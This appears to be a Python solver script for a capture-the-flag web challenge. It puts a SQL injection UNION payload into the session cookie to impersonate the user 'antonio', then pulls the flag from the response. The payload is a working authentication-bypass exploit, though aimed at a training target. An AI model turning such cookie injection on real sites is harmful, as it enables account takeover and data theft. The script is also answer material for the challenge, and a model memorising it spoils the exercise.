#!/usr/bin/env python3

import logging
import os
import requests
import re

logging.disable()

# For HTTP connection
URL = os.environ.get("URL", "http://todo.challs.olicyber.it")
if URL.endswith("/"):
    URL = URL[:-1]


cookies = {
    "session": "' UNION SELECT id, username FROM users WHERE username='antonio' -- ",
}

r = requests.get(f"{URL}/todo", cookies=cookies)
flag = re.compile(r"flag\{.*\}").search(r.text)

if flag:
    print(flag.group())
else:
    print("Flag not found")
